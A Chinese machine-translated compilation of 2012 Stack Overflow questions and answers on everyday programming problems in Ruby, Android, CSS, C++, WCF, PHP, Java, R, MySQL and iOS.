> 时间：2012-09-28T23:13:51.600
> 
> 标签：ruby, capybara

我有以下代码：

```
Capybara.register_driver :selenium do |app|
  driver = Capybara::Selenium::Driver.new(app, browser: :firefox, profile: "selenium")
  driver.browser.manage.window.resize_to(600,800)
  driver
end 
```

在运行测试期间，会弹出带有证书的窗口，所以每次我都必须按下它。

如何自动执行，或配置 Capybara firefox 配置文件以自动接受证书？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T22:12:38.793

如此[处所述](http://selenium.googlecode.com/svn/trunk/docs/api/rb/Selenium/WebDriver/Firefox/Profile.html#assume_untrusted_certificate_issuer=-instance_method)，您需要`assume_untrusted_certificate_issuer`在`false`您的`Firefox::Profile`. 例如：

```
Capybara.register_driver :selenium do |app|
  profile = Selenium::WebDriver::Firefox::Profile.new
  profile.assume_untrusted_certificate_issuer = false # <= this should work
  driver = Capybara::Selenium::Driver.new(app, :profile => profile)
  driver.browser.manage.window.resize_to(600,800)
  driver
end 
```

如果您想了解它在 firefox 驱动程序中如何工作的详细信息，请参阅[http://code.google.com/p/selenium/wiki/UntrustedSSLCertificates](http://code.google.com/p/selenium/wiki/UntrustedSSLCertificates)

# android - 具有当前日期的 Android DatePicker

> ID：12648492
> 
> 赞同：1
> 
> 时间：2012-09-28T23:14:47.177
> 
> 标签：android, date, time, datepicker

我没有在我的 datePickerDialog 中获得当前日期。总是 x.xx.1900 :/

这是我的**代码：**

```
 Calendar c = Calendar.getInstance();
    c.setTimeInMillis(System.currentTimeMillis());
    int y = c.get(Calendar.YEAR);
    int m = c.get(Calendar.MONTH);
    int d = c.get(Calendar.DAY_OF_MONTH + Calendar.DAY_OF_WEEK);

    return new DatePickerDialog(getActivity(),this,d,m,y); 
```

和：

```
DialogFragment datePicker = new DateFragment();
    datePicker.show(getSupportFragmentManager(), "datePicker"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:41:26.713

`DatePickerDialog`is的构造函数

```
public DatePickerDialog (Context context, DatePickerDialog.OnDateSetListener callBack, int year, int monthOfYear, int dayOfMonth) 
```

你应该使用这个：

```
Calendar c = Calendar.getInstance();

c.setTimeInMillis(System.currentTimeMillis());
int y = c.get(Calendar.YEAR);
int m = c.get(Calendar.MONTH);
int d = c.get(Calendar.DAY_OF_MONTH);

return new DatePickerDialog(getActivity(),this,y,m,d); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T06:30:53.387

使用它来获取最新日期

```
public String getDisplayDate(){
    return (dt.getDate()+"/"+(dt.getMonth()+1)+"/"+(dt.getYear()+1900));
} 
```

# wordpress - 破解二十一 (Wordpress) 主题的线索

> ID：12648495
> 
> 赞同：-2
> 
> 时间：2012-09-28T23:15:03.127
> 
> 标签：wordpress, layout, hook, fluid

好的，如果您知道答案，这应该是一个简单的问题：我正在尝试“破解”二十一个 Wordpress 主题，我想知道为什么我在“header-img”之前插入的一个简单的 img 不像主标题图像。

响应式或流畅的布局可能是谁或在做什么？Javascript？CSS？在哪里！！！

为什么当您手动将浏览器窗口调整为 400 像素宽时，标题图像会缩小？

我应该在哪里挂钩或硬编码我在这个主题中的“改进”？不仅插入我网站的标识，而且在用户从移动设备浏览时考虑到它等（即缩放、调整大小、重新定位等）。这些功能在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:56:59.550

21 有一个标题选项，因此您不必破解主题，只需转到外观 > 标题（或类似的东西），然后在那里更改您的图像。

响应式图像通常通过将 max-width: 100% 放入 css 来完成。

我建议你在 Firefox 或 Chrome 中获取 Firebug，只需右键单击，然后选择 Inspect Element。这将帮助您了解哪些 CSS 正在影响元素。

您可能想要研究的另一个想法是子主题，尤其是将来可能会升级的主题（因为如果您升级主题，您的更改将丢失）：[http ://codex.wordpress.org/Child_Themes](http://codex.wordpress.org/Child_Themes)

# html - CSS 挑战，我可以在不引入更多 HTML 的情况下做到这一点吗？

> ID：12648513
> 
> 赞同：13
> 
> 时间：2012-09-28T23:18:04.760
> 
> 标签：html, css

想象一下，我有任何带有文本的块或内联块。就像一个段落或里或任何东西。如果该标签具有“分隔符”类，我希望它如下所示：

所有内容都居中（text-align:center; 就足够了）。这是棘手的部分：在居中内容的两侧，会出现一条（垂直居中的）线。

下图说明了我的想法：

![我希望它看起来像的近似示例（尽管这是使用文本...](../Images/e60ffaf32a945779456a5ac644c78afc.png)

**如果我必须介绍更多 HTML，那就忘了它 - 不感兴趣。**

我是一个长期的 CSS 用户，但我无法弄清楚这个......还有其他人有想法吗？尽管我很喜欢它，但最好不要使用 CSS3（对于工作......由于兼容性，不能使用新东西）..

示例问题：`<p class="separator">CENTRE ME</p>`

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-28T23:50:40.533

这适用于 Firefox：

```
.separator {
    text-align: center;
    height: 0.5em;
    border-bottom: 2px solid black;
    margin-bottom: 0.5em;
}
.separator:first-line {
    background-color: white;
} 
```

[JSFiddle 演示](http://jsfiddle.net/LyKtp/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-03T18:31:44.167

我开发了一个不依赖 a 的解决方案`background: white`，也就是说，您可以看到分隔符文本背后的内容。只需运行示例，您就会看到：

[![在此处输入图像描述](../Images/27b0f7858aaf89fac48881e1f79d5fac.png)](https://i.stack.imgur.com/mz3FM.png)

忽略此插图中所有那些杂乱无章的选项卡……这是一个 CSS 示例，而不是组织示例。

```
.separator>*{
  display: inline-block;
  vertical-align: middle;
}
.separator {
    text-align: center;
    border: 0;
    white-space: nowrap;
    display: block;
    overflow: hidden;
    padding: 0;
    margin: 0;
}
.separator:before, .separator:after {
    content: "";
    height: 2px;
    width: 50%;
    background-color: gray;
    margin: 0 5px 0 5px;
    display: inline-block;
    vertical-align: middle;
}
.separator:before {
    margin-left: -100%;
}
.separator:after {
    margin-right: -100%;
}
```

```
<div class="texture texture1 dark-theme">
  <p class="separator">Text</p>
  <br/>
  <p class="separator"><span>Text with<br/>multiple lines</span></p>
</div>
<div class="texture texture2 dark-theme">
  <p class="separator">Text</p>
  <br/>
  <p class="separator"><span>Text with<br/>multiple lines</span></p>
</div>
<div class="texture texture3 dark-theme">
  <p class="separator">Text</p>
  <br/>
  <p class="separator"><span>Text with<br/>multiple lines</span></p>
</div>
<div class="texture texture4 light-theme">
  <p class="separator">Text</p>
  <br/>
  <p class="separator"><span>Text with<br/>multiple lines</span></p>
</div>

<style>

/**

STYLES TO MAKE THE BACKGROUND HAVE PATTERNS WHICH ARE NOT SOLID WHITE,
SO THAT YOU CAN SEE THAT IT IS VISIBLE BEHIND THE SEPARATOR.

**/

.light-theme .separator:before, .light-theme .separator:after {
  background-color: black;
}
.light-theme .separator, .light-theme .separator {
  color: black;
}
.dark-theme .separator:before, .dark-theme .separator:after {
  background-color: white;
}
.dark-theme .separator, .dark-theme .separator {
  color: white;
}

.texture {
  padding: 10px;
}

.texture3 {
  background-color: red;
  color: white;
}

.texture1 {
  //-webkit-box-sizing: content-box;
  //-moz-box-sizing: content-box;
  //box-sizing: content-box;
  //width: 320px;
  //height: 320px;
  //border: none;
  //font: normal 100%/normal Arial, Helvetica, sans-serif;
  //color: rgb(255, 255, 255);
  //-o-text-overflow: clip;
  //text-overflow: clip;
  background: -webkit-linear-gradient(63deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), -webkit-linear-gradient(-117deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), -webkit-linear-gradient(63deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), -webkit-linear-gradient(-117deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), -webkit-linear-gradient(0deg, rgb(27,27,27) 10px, rgba(0,0,0,0) 10px), -webkit-linear-gradient(-90deg, rgb(29,29,29) 25%, rgb(26,26,26) 25%, rgb(26,26,26) 50%, rgba(0,0,0,0) 50%, rgba(0,0,0,0) 75%, rgb(36,36,36) 75%, rgb(36,36,36) 100%), rgb(19, 19, 19);
  background: -moz-linear-gradient(27deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), -moz-linear-gradient(207deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), -moz-linear-gradient(27deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), -moz-linear-gradient(207deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), -moz-linear-gradient(90deg, rgb(27,27,27) 10px, rgba(0,0,0,0) 10px), -moz-linear-gradient(180deg, rgb(29,29,29) 25%, rgb(26,26,26) 25%, rgb(26,26,26) 50%, rgba(0,0,0,0) 50%, rgba(0,0,0,0) 75%, rgb(36,36,36) 75%, rgb(36,36,36) 100%), rgb(19, 19, 19);
  background: linear-gradient(27deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), linear-gradient(207deg, rgb(21,21,21) 5px, rgba(0,0,0,0) 5px), linear-gradient(27deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), linear-gradient(207deg, rgb(34,34,34) 5px, rgba(0,0,0,0) 5px), linear-gradient(90deg, rgb(27,27,27) 10px, rgba(0,0,0,0) 10px), linear-gradient(180deg, rgb(29,29,29) 25%, rgb(26,26,26) 25%, rgb(26,26,26) 50%, rgba(0,0,0,0) 50%, rgba(0,0,0,0) 75%, rgb(36,36,36) 75%, rgb(36,36,36) 100%), rgb(19, 19, 19);
  background-position: 0 5px, 10px 0, 0 10px, 10px 5px, 0 0, 0 0;
  -webkit-background-origin: padding-box;
  background-origin: padding-box;
  -webkit-background-clip: border-box;
  background-clip: border-box;
  -webkit-background-size: 20px 20px;
  background-size: 20px 20px;
}

.texture2 {
  //-webkit-box-sizing: content-box;
  //-moz-box-sizing: content-box;
  //box-sizing: content-box;
  //width: 320px;
  //height: 320px;
  //border: none;
  //font: normal 100%/normal Arial, Helvetica, sans-serif;
  //color: rgb(255, 255, 255);
  //-o-text-overflow: clip;
  //text-overflow: clip;
  background: -webkit-linear-gradient(0deg, rgba(255,255,255,0.0666667) 50%, rgba(0,0,0,0) 50%), -webkit-linear-gradient(0deg, rgba(255,255,255,0.129412) 50%, rgba(0,0,0,0) 50%), -webkit-linear-gradient(0deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.168627) 50%), -webkit-linear-gradient(0deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.188235) 50%), rgb(2, 104, 115);
  background: -moz-linear-gradient(90deg, rgba(255,255,255,0.0666667) 50%, rgba(0,0,0,0) 50%), -moz-linear-gradient(90deg, rgba(255,255,255,0.129412) 50%, rgba(0,0,0,0) 50%), -moz-linear-gradient(90deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.168627) 50%), -moz-linear-gradient(90deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.188235) 50%), rgb(2, 104, 115);
  background: linear-gradient(90deg, rgba(255,255,255,0.0666667) 50%, rgba(0,0,0,0) 50%), linear-gradient(90deg, rgba(255,255,255,0.129412) 50%, rgba(0,0,0,0) 50%), linear-gradient(90deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.168627) 50%), linear-gradient(90deg, rgba(0,0,0,0) 50%, rgba(255,255,255,0.188235) 50%), rgb(2, 104, 115);
  -webkit-background-origin: padding-box;
  background-origin: padding-box;
  -webkit-background-clip: border-box;
  background-clip: border-box;
  -webkit-background-size: 13px 13px, 29px 29px, 37px 37px, 53px 53px;
  background-size: 13px 13px, 29px 29px, 37px 37px, 53px 53px;
}

.texture4 {
  //-webkit-box-sizing: content-box;
  //-moz-box-sizing: content-box;
  //box-sizing: content-box;
  //width: 320px;
  //height: 320px;
  //border: none;
  //font: normal 100%/normal Arial, Helvetica, sans-serif;
  //color: rgba(255,255,255,1);
  //-o-text-overflow: clip;
  //text-overflow: clip;
  background: -webkit-linear-gradient(45deg, rgba(255,255,255,0.2) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 50%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0.2) 75%, rgba(0,0,0,0) 75%, rgba(0,0,0,0) 0), rgb(170, 204, 0);
  background: -moz-linear-gradient(45deg, rgba(255,255,255,0.2) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 50%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0.2) 75%, rgba(0,0,0,0) 75%, rgba(0,0,0,0) 0), rgb(170, 204, 0);
  background: linear-gradient(45deg, rgba(255,255,255,0.2) 25%, rgba(0,0,0,0) 25%, rgba(0,0,0,0) 50%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0.2) 75%, rgba(0,0,0,0) 75%, rgba(0,0,0,0) 0), rgb(170, 204, 0);
  background-position: auto auto;
  -webkit-background-origin: padding-box;
  background-origin: padding-box;
  -webkit-background-clip: border-box;
  background-clip: border-box;
  -webkit-background-size: 50px 50px;
  background-size: 50px 50px;
}
</style>
```

PS：我使用的背景例子不是我的创作。我在[enjoycss.com](http://enjoycss.com/)得到了它们。红色的背景，嗯，这也不是我的创作，也不是他们的……没有人的创作，也许吧。谁创造了`red`……我不知道。如果你这样做了，而我没有给予信任，请在评论中留言。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T23:32:01.533

很抱歉打扰您，但是如果不引入至少一个额外的标签，就无法在 HTML/CSS 中做到这一点。

唯一可以近似的方法是使用 :before 和 :after 伪类，但它无法插入 html 内容，更不用说根据内容具有可变宽度的内容了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-28T23:35:54.430

你去：

```
<p class="separator"></p>

p.separator {
    line-height:1em;
    border-bottom:1px solid red;
}
p.separator:before {
    content:"TEXT";
    position:relative;
    left:50%;
    margin-left:-2.5em; /* half the number of chars */
    padding:0 0.3em;
    top:0.5em;
    background:white;
} 
```

[**演示**](http://jsfiddle.net/gionaf/PTz7D/)​</p>

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-29T06:27:17.680

您可以为线条使用背景图像，然后为文本提供一系列黑色文本阴影以模拟 2-3 像素的笔触，覆盖文本周围和文本之间的背景。

IE。[CSS字体边框？](https://stackoverflow.com/questions/2570972/css-font-border/12650350#12650350)

[http://jsfiddle.net/4mPkU/](http://jsfiddle.net/4mPkU/) - 示例

向后兼容性将是基于文本阴影支持的问题。（有一个 IE 过滤器可能有助于兼容性）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-05-21T11:31:43.597

```
.center-separator {
    display: flex;
  line-height: 1em;
  color: gray;
}

.center-separator::before, .center-separator::after {
    content: '';
    display: inline-block;
    flex-grow: 1;
    margin-top: 0.5em;
    background: gray;
    height: 1px;
    margin-right: 10px;
    margin-left: 10px;
  } 
```

[https://jsfiddle.net/0Lkj6wd3/](https://jsfiddle.net/0Lkj6wd3/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-28T23:25:00.903

要使某些东西动态化，您可以执行以下操作：

```
<ul>
    <li>
        <div class='lineLeft'></div>
        <div class='inlineText'></div>
        <div class=lineRight'></div>
    </li>
</ul> 
```

基本上在这里你可以将'inlineText' div 设置为居中（不必是一个div，现在只是一个想法），然后'lineLeft' 和'lineRight' 都将被设置为相应的左/右浮动样式，高度设置为父列表项标签高度的一半。然后在 css 中给每个边 div 一个底部边框。

这是我能想到的最动态的解决方案。它有点更多的 HTML，但假设您可以正确调整所有内容的大小，它将正确地实现您的目标。

让我们知道。祝你好运。

# sass - Sass 输出样式在更改时不会更新

> ID：12648515
> 
> 赞同：2
> 
> 时间：2012-09-28T23:18:20.030
> 
> 标签：sass

我正在使用 Sass 3.2.1（媒体标记），并使用“--watch main.scss:main.css --style compact”例如，以该特定样式输出我的 css。**看来样式更改只有**在我删除 css 文件并打开它后才会生效。

如果我返回scss文件并保存它，css将返回默认scss。不应该“--watch main.scss:main.css --style compact”使输出紧凑，直到我将其更改为--expanded，--compressed???

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T17:32:11.420

Sass 不会重新编译 CSS，除非您的 Sass 文件发生更改，即使您已经切换了压缩类型。

就个人而言，我只有 2 个不同的手表输出到 2 个不同的目录。手表`compact`始终在运行并输出到我在 CVS 中的“生产”目录。使用的第二个手表`expanded`仅在我需要调试时运行，它输出到设置为被 CVS 忽略的目录。这样，就不会意外提交未压缩的版本。

# c++ - std::set 的 find()

> ID：12648516
> 
> 赞同：4
> 
> 时间：2012-09-28T23:18:20.637
> 
> 标签：c++, stl, set, std

我对如何比较存储在 set 中的对象有疑问。

```
class A
{
public:  
char * name;
}; 
```

我将 A 的对象存储在一个集合中。我提供了一个比较器类，它提供了 operator() （ A &ob1, A & ob2 ）的实现。这里我比较 ob1.name 和 ob2.name，当 ob1.name 小于 ob2.name 时返回 true。

我可以使用 set 的 find() 搜索对象吗？我只为 operator() 提供了实现。这足够了吗？有人可以解释 find() 在这种情况下是如何工作的吗？

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T00:45:10.730

> 我可以使用 set 的 find() 搜索对象吗？我只为 operator() 提供了实现。这足够了吗？

`comparator`是的，仅提供仅具有实现的类就足够了`operator ()(A&,A&)`。请参阅默认比较器`std::less<>`。

> 有人可以解释 find() 在这种情况下是如何工作的吗？

非常简单地说：当且仅当两个比较都失败时才`std::set<T,comparator>::find(k)`返回迭代器：`it`

1.  假 == 比较器（k，*它）
2.  假 == 比较器(*it, k)

否则它会返回`std::set<>::end()`...

* * *

从数学意义上讲 -`std::set`通过这个公式的弱排序来定义相等：

```
 a == b  <==>  !(a < b) && !(b < a) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T23:36:09.800

将在其中使用的函数是您声明为集合的模板参数的类`std::set::find()`的实例。`Comparator`

```
template < class Key, class Compare = less<Key>,
           class Allocator = allocator<Key> > class set; 
```

具体来说，比较器实例将被传递给 Key 对象，如果第一个位于第二个之前，则应该返回 true。所以**是的，你的实现很好。**

现在，进一步挖掘：如果你想说服自己，你可以深入挖掘 gcc 标准库实现的源代码，你会发现：

```
 template<typename _Key, typename _Val, typename _KeyOfValue,
           typename _Compare, typename _Alloc>
    typename _Rb_tree<_Key, _Val, _KeyOfValue,
              _Compare, _Alloc>::iterator
    _Rb_tree<_Key, _Val, _KeyOfValue, _Compare, _Alloc>::
    find(const _Key& __k)
    {
      iterator __j = _M_lower_bound(_M_begin(), _M_end(), __k);
      return (__j == end()
          || _M_impl._M_key_compare(__k, _S_key(__j._M_node))) ? end() : __j;
    } 
```

您可以看到（这是您提供的类`_M_key_compare`的一个实例），作为第一个参数（您的一个）调用，其返回值是一个键。的返回值用于三元表达式，所以它应该是一个布尔值。`_Compare``__k``Key``_S_key(...)``_M_key_compare`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-29T02:24:30.263

> 我将 A 的对象存储在一个集合中。我提供了一个比较器类，它提供了 operator() （ A &ob1, A & ob2 ）的实现。

这是不正确的。容器`std::set`维护根据第二个模板参数中配置的比较器排序的元素。为了保证不破坏顺序不变性，容器将键存储为常量对象，这反过来意味着比较器必须通过`const &`.

一般来说，比较器应该`operator()`通过 const-reference 提供两个元素，并且成员函数应该是`const`它自己：

```
struct comparator : std::binary_function<A,A,bool> {
   bool operator()( A const& lhs, A const& rhs ) const;
}; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-28T23:33:24.700

您可以使用 set.find 或 set.count，set::find() 如果未找到元素则返回 set::end()，如果未找到元素，则相似计数为零。

```
set<Item*> itemSet;

Item* item = new Item();    

if (itemSet.count(item) == 0)
{
    std::cout<<"not found"
}
//or
if (itemSet.find(item) == itemSet.end())
{
    std::cout<<"not found"
} 
```

# c# - 如何在不设置数据协定的情况下使用 WCF 服务响应？

> ID：12648524
> 
> 赞同：1
> 
> 时间：2012-09-28T23:20:34.370
> 
> 标签：c#, wcf, rest, .net-4.0

## 背景

我继承了一个项目，该项目的数据依赖于几个不同的 WCF“mex”端点。一旦完成，我的特定项目的目标是充当调用这些*遗留*WCF 服务的 API 层，操作返回的对象（仅在极少数情况下），序列化为 JSON，然后对请求的客户端做出 Restfully 响应。

C#、MVC 4、.NET 4。

我对 RESTful Web 服务非常有经验，但对 WCF 却没有。

以下是端点 uri 的示例：

`http://product.sqa.acme.com/products.svc/mex`

## 问题

在设置使用其中一个 WCF 服务的第一个类时，似乎我必须设置整个数据协定才能使用返回的对象。它是否正确？如果这不正确，我如何调用 WCF 接口（即`IProductService >> GetProductById(123)`）的方法，然后在没有契约的情况下操作生成的对象？

我试过这个：

```
var ip = (IProductService)new ProductServiceClient("http://product.sqa.acme.com/product.svc/mex");
            var product = ip.GetProductById("DVP4963619"); 
```

但是代码失败了，因为没有找到合约。由于我将要做的 90% 只是简单地传递一个请求，然后将响应序列化为 JSON，因此必须为我进行的每个服务调用定义一个合同似乎有点过头了。任何帮助表示赞赏。

谢谢，

马特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:26:17.997

要*使用*该服务，您只需将 Visual Studio 的“添加服务引用”向导指向您拥有的“mex”端点，它将为您生成一个客户端，包括用于该服务的数据协定类。

要创建*返回*数据的 (REST) 服务，您有两个选择。您可以创建代表您想要返回的数据的数据合约（或重用工具生成的数据合约）。或者，如果您想完全控制操作的输出，您可以绕过这些。如果操作返回一个`Stream`类型，您可以将任何内容（JSON 或非 JSON）写入输出（通过返回该抽象类型的子类），因此您不必为此创建数据协定。[您可以在http://blogs.msdn.com/b/carlosfigueira/archive/2008/04/17/wcf-raw-programming-model-web.aspx](http://blogs.msdn.com/b/carlosfigueira/archive/2008/04/17/wcf-raw-programming-model-web.aspx)找到更多这种“原始模式” 。

返回数据的另一种选择是使用 ASP.NET Web API 之类的东西，它确实支持使用 Newtonsoft.Json.Linq 命名空间中的 JSON.NET 类型的“无类型 JSON”模型。

# php - 已安装 php5-curl，但 suse 上的 php 未使用

> ID：12648525
> 
> 赞同：0
> 
> 时间：2012-09-28T23:20:51.200
> 
> 标签：php, curl, libcurl, suse

我刚刚在 SUSE 上为 PHP 安装了 cURL，正在加载我的`phpinfo()`节目`curl.ini`，但我仍然收到 php 错误，例如：

```
Fatal error: Call to undefined function curl_init() 
```

我`phpinfo()`正在这里加载：http: [//beatengine.com/network/home/server](http://beatengine.com/network/home/server)

有人可以告诉我有什么问题吗？我已经重新启动了几次apache，但无济于事

# java - 一次完全移动 2d 形状 JAVA

> ID：12648526
> 
> 赞同：1
> 
> 时间：2012-09-28T23:20:53.490
> 
> 标签：java

我有一个 java 项目，我现在似乎不太明白。

它希望我们从一个名为 Wheels 的包中创建一个由 2D 形状组成的复合对象。

这个复合对象需要接受`mouseEvent`s 才能在单击和拖动时一起移动。我已经完成了这部分，但是下一部分的任务要求我们让该对象的一部分能够独立拖动，这样当您拖动它时，整个复合对象不会移动。

虽然当您拖动复合对象时，独立对象应该移动相同的量以保持相对于复合对象的位置。

这是我认为需要一些工作的课程。

```
public Character(Color _color1, Color _color2)
{
    _indPart1 = new IndPart(); // head
    _charPart2 = new CharacterPart(this); // body
    _charPart3 = new CharacterPart(this); //left arm
    _charPart4 = new CharacterPart(this); //right arm
    this.setColor(_color1, _color2);
    _indPart1.setSize(50, 50);
    _charPart2.setSize(50, 100);
    _charPart3.setSize(75, 35);
    _charPart4.setSize(75, 35);
}

public void setLocation(int x, int y)
{
    _x = x;
    _y = y;
    //_indPart1.setLocation((_x - _otherPointx) + (x - 300), (_y - _otherPointy) + (y - 250)); // head
    _indPart1.setLocation(x, y - 50); // head
    _charPart2.setLocation(x, y); //body
    _charPart3.setLocation(x + 51, y); // right arm
    _charPart4.setLocation(x - 76, y); // left arm
}

@Override
public void mousePressed(MouseEvent e)
{
    _prevPoint = e.getPoint();
}

@Override
public void mouseDragged(MouseEvent e) 
{
    _currPoint = e.getPoint();
    //_otherPointx = _indPart1.getXLocation();
    //_otherPointy = _indPart1.getYLocation();
    _diffx = _currPoint.x - _prevPoint.x;
    _diffy = _currPoint.y - _prevPoint.y;
    this.setLocation(_x + _diffx, _y + _diffy);
    _prevPoint = _currPoint;
    //_otherPointx = _currPoint.x;
    //_otherPointy = _currPoint.y;
}

public void setColor(Color c1, Color c2)
{
    _indPart1.setColor(c1);
    _charPart2.setColor(c2);
    _charPart3.setColor(c1);
    _charPart4.setColor(c1);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:59:33.993

```
public void mouseDragged(MouseEvent e)
{

    if(_indPart1.contains(e.getPoint()))
    {

        // do your stuff with the draggable part and leave the whole component still

    }else {

        // drag the whole component

    }

} 
```

# javascript - 使用 javascript 获取 Json 数据 (Google Api)/Trello

> ID：12648529
> 
> 赞同：0
> 
> 时间：2012-09-28T23:21:42.207
> 
> 标签：javascript, json, google-apps-script

我正在尝试获取 Trello 发回给我的一些数据，并将其放入 Google Apps Script for Spreadsheet 中。json看起来像：

```
 date: "XXXXXX",
 type: "XXXXXX",
 memberCreator: {
     id: "XXXXXXX",
    avatarHash: "XXXXXXXXX",
    username: "XXXXXXX",
    initials: "XXX",
    fullName: "XXXXXXXXX" 
```

我试图通过使用以下方法来解决它，但它返回未定义（或我认为是 NaN）并且我不能使用 jQuery：

```
for(var j=0; j < singleCard.length; j++){
  var str = singleCard[j]["memberCreator"]["fullname"];
  if(str == "something"){
      Do something here;
    }
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:20:38.617

使用`fullName`而不是`fullname`- 对象属性区分大小写。这里：

```
for(var j=0; j < singleCard.length; j++){
  var str = singleCard[j]["memberCreator"]["fullName"];
  if(str == "something"){
      Do something here;
    }
 } 
```

# r - 在关卡上应用循环

> ID：12648531
> 
> 赞同：-4
> 
> 时间：2012-09-28T23:21:58.020
> 
> 标签：r, csv

我有一个巨大的 csv 体育 (EPL) 数据文件，其中包含各自球队在每场比赛中的球员表现。我想运行一个循环来比较球队在比赛中首先得分的次数（数据称为`First.Goal`）。

我知道如何单独计算它们，例如对于利物浦来说，来自一个名为的 csv `Prem1112`：

```
Prem<-read.csv("Prem1112.csv")

sum(subset(Prem,Team=='Liverpool',First.Goal)) 
```

理想情况下，我想运行循环，这样我就不必单独计算所有 20 个团队。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T07:36:43.687

那这个呢：

```
aggregate(First.Goal ~ Team, Prem, sum) 
```

# mysql - 重构庞大的非规范化mysql数据库

> ID：12648535
> 
> 赞同：2
> 
> 时间：2012-09-28T23:22:21.723
> 
> 标签：mysql, database, database-design, database-schema

嗨，我有一个巨大的非规范化 mysql 数据库，其中包含（约 1 亿）个 url（约 20% 重复）分为相同的拆分表，每个表有 1300 万行。

我想将 url 移动到同一 mySql 服务器上的规范化数据库中。

旧的数据库表未规范化，并且 url 没有索引它看起来像这样：

```
entry{id,data,data2, data3, data4, possition,rang,url} 
```

我要把它分成多张桌子。

```
url{id,url}
data{id,data}
data1{id,data}
etc 
```

我做的第一件事是

```
INSERT IGNORE INTO newDatabase.url (url)
SELECT DISTINCT unNormalised.url FROM oldDatabase.unNormalised 
```

但是“SELECT DISTINCT unNormalised.url”（1300 万行）需要很长时间，我认为既然“INSERT IGNORE INTO”也进行了比较，那么只需执行

```
INSERT IGNORE INTO newDatabase.url (url)
SELECT unNormalised.url FROM oldDatabase.unNormalised 
```

如果没有 DISTINCT，这个假设是错误的吗？

无论如何它仍然需要永远，我需要一些帮助，有没有更好的方法来处理如此大量的非标准化数据？如果我在整个 1 亿行数据库上执行 SELECT DISTINCT unNormalised.url" 并导出所有 id，然后使用 php 脚本仅将这些 id 移动到新数据库中，那会更好吗？

欢迎所有想法，我不知道如何在不花一年时间的情况下移植所有这些日期！

ps 它托管在 rds 亚马逊服务器上。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T01:25:19.930

正如[MySQL 手册所说](http://dev.mysql.com/doc/refman/5.6/en/load-data.html)的那样，加载数据的`LOAD DATA INFILE`最快`INSERT`方法是：

```
LOCK TABLES url WRITE;
ALTER TABLE url DISABLE KEYS;
LOAD DATA INFILE 'urls.txt'
    IGNORE
    INTO TABLE url
    ...;
ALTER TABLE url ENABLE KEYS;
UNLOCK TABLES; 
```

但是由于您已经将数据加载到 MySQL 中，但只需要对其进行规范化，您可以尝试：

```
LOCK TABLES url WRITE;
ALTER TABLE url DISABLE KEYS;
INSERT IGNORE INTO url (url)
    SELECT url FROM oldDatabase.unNormalised;
ALTER TABLE url ENABLE KEYS;
UNLOCK TABLES; 
```

我的猜测是这`INSERT IGNORE ... SELECT`会比这更快，`INSERT IGNORE ... SELECT DISTINCT`但这只是一个猜测。

# objective-c - 解决 iOS 应用程序中的死锁

> ID：12648536
> 
> 赞同：0
> 
> 时间：2012-09-28T23:22:30.640
> 
> 标签：objective-c, automatic-ref-counting

所以我正在尝试将项目转换为 ARC。第一次尝试，我只是转换了所有东西，我的一个观点遇到了这个问题，它只是挂起。我无法单击任何 UI 元素，控制台上没有打印任何内容，也没有崩溃。它只是坐在那里。

所以为了开始故障排除，我转换了所有简单的类和viewControllers，然后对于一些更复杂的模型类和UIViewController类，我为-fno-objc-arc设置了编译器标志。我的应用程序运行得更好，但它仍然处于挂起的状态。在转换为 ARC 之前，我从未在上面看到过这个。我想知道是否有其他人遇到过这个问题以及我可以做些什么来解决它。谢谢~

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T20:57:47.700

我会在调试器中按“暂停”并查看应用程序中所有线程的调用堆栈。这可以指出您的应用程序被锁定的原因。

# java - 来自网页的蓝牙

> ID：12648540
> 
> 赞同：2
> 
> 时间：2012-09-28T23:23:36.207
> 
> 标签：java, javascript, bluetooth

是否有可能让 JavaScript 调用 Java 文件（或类似的东西），以便我们可以连接到蓝牙设备并从网页向其发送命令？

